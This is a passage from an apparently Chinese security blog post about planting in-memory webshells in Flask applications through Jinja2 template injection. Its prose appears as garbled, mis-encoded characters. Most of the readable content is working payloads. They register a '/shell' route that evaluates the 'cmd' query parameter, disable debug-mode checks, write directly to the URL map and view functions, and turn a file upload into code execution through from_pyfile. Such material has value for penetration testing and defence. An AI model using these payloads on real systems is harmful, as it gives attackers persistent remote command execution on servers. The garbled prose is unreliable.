<p>æˆ‘åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å‘ç°ï¼Œ<code>lipsum. ... .__import__("__main__").app.add_url_rule</code> ä¼¼ä¹ä¼šæ”¹å˜ <code>lipsum</code> çš„ä¸Šä¸‹æ–‡å±æ€§ï¼Œå¯¼è‡´åœ¨å®é‡Œæ— æ³•å¼•ç”¨åˆ° <code>lipsum</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª payload æ˜¯ä¸è¡Œçš„ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p>
<p>ä»¥åŠç”±äº <code>macro</code> å’Œæ™®é€šå‡½æ•°ä¸å¤ªä¸€æ ·ï¼Œå®ƒæ˜¯æ²¡æœ‰ <code>__name__</code> çš„ã€‚æ‰€ä»¥å¿…é¡»æŒ‡å®šä¸€ä¸‹ endpointã€‚</p>
<p>é™¤äº†å®ä¹‹å¤–ï¼Œè¿˜æœ‰åŠæ³•æä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°å‡ºæ¥å—ï¼Ÿå¦‚æœå¯ä»¥ä½¿ç”¨ <code>def</code> å°±å¥½äº†ã€‚é‚£ä¹ˆè¿™ä¸ª <code>exec</code> å°±å¯ä»¥å®ç°ã€‚è™½ç„¶ exec è¿”å›å€¼å›ºå®šæ˜¯ Noneï¼Œä½†æ˜¯å…¶å®é‡Œé¢å®šä¹‰çš„å‡½æ•°åœ¨å¤–è¾¹æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼ˆ<strong>é€šå¸¸æƒ…å†µ</strong>ï¼‰ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/ae46efd6-2569-4a79-8fa1-8ec65a4eb3ee.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ä¸Šé¢ç‰¹åˆ«æ ‡æ³¨äº† â€œé€šå¸¸æƒ…å†µâ€ï¼Œä¸ºä½•å‘¢ï¼Ÿ<code>eval</code>ã€<code>exec</code>ã€<code>compile</code> éƒ½æ˜¯éå¸¸æœ‰è¶£çš„å†…ç½®å‡½æ•°ï¼Œä»–ä»¬æœ‰éå¸¸å¤šçš„ç‰¹æ€§ï¼Œæœ‰æœºä¼šæˆ‘ä¸“é—¨å†™ä¸€ç¯‡æ¥ä»‹ç»ã€‚</p>
<p>æ€»ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š<code>eval('exec("def x(): return x")')</code></p>
<p>å½“ç„¶ï¼Œ<code>compile</code> ä¹Ÿæ˜¯ ok çš„ï¼Œæ‰€ä»¥è¿˜å¯ä»¥è¿™æ ·ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).FunctionType(<br>  <span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">&#x27;def foo(): return &quot;bar&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span><br>  ).co_consts[<span class="hljs-number">0</span>],<br>  <span class="hljs-built_in">globals</span>()<br>)<br></code></pre></td></tr></table></figure>
<p>ç»“åˆ jinja2 çš„ SSTI å°±æ˜¯è¿™æ ·äº†ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br></code></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;__import__(&quot;types&quot;).FunctionType(compile(</span><br><span class="hljs-string">      &quot;def x(): &quot;</span><br><span class="hljs-string">        &quot;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&quot;, </span><br><span class="hljs-string">      &quot;&quot;,</span><br><span class="hljs-string">      &quot;exec&quot;</span><br><span class="hljs-string">    ).co_consts[0], globals())&#x27;</span><br>  )<br>)<br></code></pre></td></tr></table></figure>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/7ba8229a-b7ad-4161-a17d-b3c10b5a37ea.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h4 id="ç»•è¿‡-setup-function-debug-æ¨¡å¼é™åˆ¶">ç»•è¿‡ setup function debug æ¨¡å¼é™åˆ¶</h4>
<p>æ­£å¦‚ä¸Šé¢è¯´çš„é‚£æ ·ï¼Œåœ¨ debug æ¨¡å¼ä¸‹æ˜¯æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨ setup function çš„ã€‚å¥½åœ¨æœ‰ç»•è¿‡çš„åŠæ³•ï¼ˆä¸‹é¢å‡ä»¥ <code>add_url_rule</code> ä¸ºä¾‹ï¼‰ã€‚</p>
<blockquote>
<p>ä¿®æ”¹å±æ€§</p>
</blockquote>
<p><code>_is_setup_finished</code> ä¸­çš„é™åˆ¶ï¼Œæ˜¯å®æ—¶è·å–å±æ€§æ¥åˆ¤æ–­çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ <code>app.deug = False</code> æˆ–è€… <code>app._got_first_request = False</code> å³å¯ç»•è¿‡ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">setattr</span>(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app,<br>  <span class="hljs-string">&quot;debug&quot;</span>,<br>  <span class="hljs-literal">False</span><br>), <br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/1f62e65b-b017-4e24-a3e4-4e3c33acdc5e.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<blockquote>
<p>æ¨¡æ‹Ÿ setup function</p>
</blockquote>
<p>åœ¨ <code>site-packages/flask/app.py</code> ä¸­å¯ä»¥çœ‹åˆ° <code>add_url_rule</code> çš„é€»è¾‘ä¼¼ä¹æ¯”è¾ƒå¤æ‚ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒæœ€ä¸»è¦çš„æ“ä½œå°±ä¸¤ä¸ªï¼š</p>
<ol type="1">
<li><code>rule = self.url_rule_class(rule, methods=methods, **options)</code> &amp; <code>self.url_map.add(rule)</code></li>
<li><code>self.view_functions[endpoint] = view_func</code></li>
</ol>
<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰§è¡Œï¼š</p>
<ol type="1">
<li><code>app.url_map.add(app.url_rule_class("/shell", methods=&#123;"GET"&#125;, endpoint="x"))</code>ï¼Œå°±å¯ä»¥åœ¨ <code>/shell</code> ä¸Šæ³¨å†Œä¸€ä¸ªå« <code>x</code> çš„ endpoint</li>
<li><code>app.view_functions["x"] = eval</code>ï¼Œè¿™æ ·å°±å®Œæˆäº† endpoint ä¸å‡½æ•°çš„ç»‘å®š</li>
</ol>
<p>è¿˜æ˜¯ä»¥ SSTI ä¸ºä¾‹ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.url_map.add(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app.url_rule_class(<br>    <span class="hljs-string">&quot;/shell&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>], endpoint=<span class="hljs-string">&quot;x&quot;</span><br>  )<br>),<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.view_functions.__setitem__(<br>  <span class="hljs-string">&quot;x&quot;</span>,<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>      <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>        <span class="hljs-string">&#x27;def x(): &#x27;</span><br>          <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>      <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>    )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e91f0ec0-5330-45c6-b2a6-1d0549ee38b9.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h4 id="å…¶ä»–-setup-function">å…¶ä»– setup function</h4>
<p>åƒ <code>before_request_funcs</code>ã€<code>after_request</code>ã€<code>register_error_handler</code> ä¹‹ç±»çš„åº”è¯¥éƒ½æ˜¯å¯ä»¥ç”¨æ¥æå†…å­˜é©¬çš„ã€‚å¯èƒ½è¿˜æœ‰ä¸€äº›å…¶ä»–å‡½æ•°ï¼Œæœ‰éœ€è¦ç”¨çš„æ—¶å€™å¯ä»¥ç¿»ç¿»å®˜æ–¹æ–‡æ¡£å°è¯•ä¸€ä¸‹ã€‚</p>
<h4 id="ä»æ–‡ä»¶å†™åˆ°-rce">ä»æ–‡ä»¶å†™åˆ° RCE</h4>
<p>åœ¨ã€ŠPython æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“ã€‹ä¸­æˆ‘ä»¬æåˆ°è¿‡ï¼Œå¦‚æœå­˜åœ¨æ–‡ä»¶å†™æ¼æ´ï¼Œåˆ™å¯ä»¥é€šè¿‡ import æˆ–è€… exec ç­‰ç­‰å®Œæˆ RCEã€‚</p>
<p>åœ¨ flask çš„åœºæ™¯ä¸‹ï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„é€”å¾„ã€‚</p>
<p>åœ¨ <code>from_pyfile</code> ä¸­ï¼Œä¼šæ‰§è¡Œ execï¼Œä¸”ç”±äº exec çš„ç‰¹æ€§ï¼Œä¼šæŠŠ exec ä¸­æ‰§è¡Œç”Ÿæˆçš„å˜é‡å­˜å‚¨åœ¨ <code>d.__dict__</code>ï¼Œæ‰€ä»¥ exec ä¸­çš„å˜é‡å‡å¯ä»¥é€šè¿‡ <code>d.</code> è·å–åˆ°ã€‚è€Œæœ€ååˆä¼šè°ƒç”¨ <code>from_object</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†å…¨å¤§å†™çš„å˜é‡åç½®ä¸º <code>self</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>flask.Flask.config</code>ï¼‰çš„å±æ€§ã€‚</p>
<p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e95e5f6b-26b4-4a4f-a86d-a5fbe2c3b348.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨ç›®æ ‡ç¯å¢ƒä¸­åˆ›å»ºä¸€æ®µåŒ…å« Python ä»£ç çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼‰ï¼Œå¹¶åœ¨é‡Œé¢åˆ›å»ºä¸€ä¸ªå…¨å¤§å†™å˜é‡å <code>CMD = eval</code>ï¼Œç„¶åè§¦å‘ <code>from_pyfile</code>ï¼ˆä¾‹å¦‚ SSTIï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ config ä¸­ç›´æ¥ç”¨åˆ°è¿™ä¸ª evalï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>)<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.from_pyfile</span>(<span class="hljs-string">&quot;file.png&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>ç„¶åç›´æ¥ <code>&#123;&#123;config.CMD&#125;&#125;</code> ä½¿ç”¨å³å¯ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4667502f-1e22-4647-9973-3f29a4211126.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ä¸ªäººè§‰å¾—è¿™ä¸ªä¹Ÿç®—å†…å­˜é©¬äº†ã€‚</p>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>flask çš„æ”»å‡»é¢è¿˜æ˜¯æ¯”è¾ƒå¹¿çš„ï¼Œæ¯•ç«Ÿä½œä¸ºä¸€ä¸ª Web åº”ç”¨æ¡†æ¶ï¼Œèƒ½æ‰¿è½½çš„åŠŸèƒ½æ˜¯éå¸¸ä¸°å¯Œçš„ï¼Œå®ƒè¿˜æœ‰å„ç§å„æ ·çš„æ’ä»¶ã€‚</p>
<p>æ‰€ä»¥åœ¨è€ƒé‡ flask åº”ç”¨çš„æ—¶å€™ï¼Œflask æœ¬èº«çš„å®‰å…¨æ€§ï¼ˆä»£ç /æ¶æ„ï¼‰ã€é€šè¿‡ flask æ­å»ºçš„åº”ç”¨çš„å®‰å…¨æ€§ï¼ˆä»£ç /é€»è¾‘ï¼‰ã€æ’ä»¶ï¼ˆç¬¬ä¸‰æ–¹ä»£ç ï¼‰éƒ½æ˜¯ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚æ‰€ä»¥è¿™éƒ¨åˆ†çš„å†…å®¹ä¸€ç¯‡æ–‡ç« æéš¾ä»¥æ€»ç»“å…¨ï¼Œæœ¬æ–‡å°±å…ˆä»‹ç»åˆ°è¿™ï¼Œåé¢å¦‚æœå‘ç°æ–°çš„å§¿åŠ¿ä¼šç»§ç»­è¡¥å……ã€‚</p>
<h2 id="èµ„æ–™">èµ„æ–™</h2>
<ol type="1">
<li>werkzeug æ–‡æ¡£<br />
https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/tutorial.html</li>
<li>flask cve<br />
https://snyk.io/vuln/pip:flask</li>
<li>flask-session-cookie-manager<br />
https://github.com/noraj/flask-session-cookie-manager</li>
<li>SecMap - SSTIï¼ˆjinja2ï¼‰<br />
https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/</li>
<li>flask æ ‡å‡†ä¸Šä¸‹æ–‡<br />
https://flask.palletsprojects.com/en/2.1.x/templating/#standard-context</li>
<li>flask request å±æ€§<br />
https://flask.palletsprojects.com/en/2.1.x/api/#incoming-request-data</li>
<li>dibber<br />
https://github.com/Macr0phag3/dibber</li>
</ol>
</br>
<p style="text-align: center; font-weight: bolder">
<font size="2" color="gray">æœ€è¿‘é‡åˆ°äº† Python + yaml çš„ååºåˆ—åŒ–é—®é¢˜<br>æ‰€ä»¥ä¸‹ä¸€ç¯‡ä¼°è®¡æ˜¯è¡¥é½ä¸€ä¸‹è¿™éƒ¨åˆ†çŸ¥è¯†ç‚¹<br>ä¸€èµ·åŠ æ²¹ ğŸ’ª</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">ç»éªŒæ€»ç»“</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/SecMap/">#SecMap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SecMap - Flask</div>
      <div>https://www.tr0y.wang/2022/05/16/SecMap-flask/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´5æœˆ16æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2025å¹´4æœˆ15æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/30/xsleaks-wiki-zh_CN/" title="xsleaks wiki ä¸­æ–‡ç‰ˆå‘å¸ƒ">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">xsleaks wiki ä¸­æ–‡ç‰ˆå‘å¸ƒ</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/04/29/SecMap-SSTI-mako/" title="SecMap - SSTIï¼ˆmakoï¼‰">
                        <span class="hidden-mobile">SecMap - SSTIï¼ˆmakoï¼‰</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
